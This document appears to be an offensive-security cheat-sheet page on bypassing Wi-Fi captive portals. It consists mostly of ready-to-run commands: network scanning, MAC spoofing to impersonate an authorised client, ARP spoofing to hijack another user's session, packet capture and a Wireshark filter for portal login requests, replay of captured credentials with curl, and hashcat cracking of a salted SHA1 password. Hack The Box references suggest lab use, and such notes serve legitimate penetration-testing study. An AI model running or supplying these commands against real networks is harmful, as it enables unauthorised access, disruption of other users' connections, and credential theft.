#wifi #captive-portal #bypass #arpspoof

# Bypassing Wi-Fi Captive Portals

Related: [evil-twin](evil-twin.md) · [tools](tools.md) · [traffic-analysis](../Network/traffic-analysis.md) · [hashcat](../Passwords/hashcat.md)

## Contents
- [Recon](#recon)
- [MAC Spoofing (impersonate an authorized client)](#mac-spoofing-impersonate-an-authorized-client)
- [Automated Bypass](#automated-bypass)
- [DNS / VPN Tunnel Bypass](#dns--vpn-tunnel-bypass)
- [ARP Spoofing / Hijacking](#arp-spoofing--hijacking)
- [HTTP Credential Interception](#http-credential-interception)

## Recon
```bash
route -n
```
Find the gateway (`traceroute 8.8.8.8` to test egress, `-p 80` for port rules).

```bash
sudo nmap -p- -sV 192.168.0.1
```
Enumerate the captive portal host.

## MAC Spoofing (impersonate an authorized client)
```bash
sudo nmap -v -n -sn 192.168.0.1/24 | awk '/is up/{print up}; {gsub(/\(|\)/,""); up=$NF}/MAC Address:/{print " => "$3;}'
```
List active devices and their MACs.

```bash
sudo ifconfig wlan0 down; sudo macchanger -m 5c:1a:cf:b5:8f:cc wlan0; sudo ifconfig wlan0 up
```
Spoof an authorized MAC.

## Automated Bypass
```bash
sudo bash hack-captive.sh
```
Try common captive-portal bypasses (hack-captive-portals).

## DNS / VPN Tunnel Bypass
```bash
dig hackthebox.com +short
```
Check if DNS is resolved pre-auth (tunnelable).

```bash
nmap -sU -sV -p 53 192.168.0.1
```
Check if port 53 is open for a DNS tunnel. See [pivoting](../Network/pivoting.md).

## ARP Spoofing / Hijacking

> [!CAUTION]
> This actively intercepts an already-authenticated client's traffic — it disrupts that client's connection and is easily flagged by ARP-watch tooling or IDS on monitored networks.

```bash
arpspoof -i wlan0 -t <clientIP> <gatewayIP>
```
MITM an authenticated client to ride their session.

## HTTP Credential Interception
```bash
sudo airodump-ng -c 1 --bssid 6A:48:AC:B4:EF:06 wlan0mon -w credcap
```
Capture traffic to a file (view with Wireshark).

```text
(http.request.method == "POST" && ip.dst == 192.168.0.1)
```
Wireshark filter for portal login POSTs.

```bash
curl -X POST -d 'username=admin&password=<hash>&submit=Sign+In' 192.168.0.1
```
Replay captured portal credentials.

```bash
hashcat -m 110 -a 0 <sha1>:HTB-Salt /path/to/wordlist
```
Crack a salted SHA1 portal password (`-m 100` unsalted). See [hashcat](../Passwords/hashcat.md).
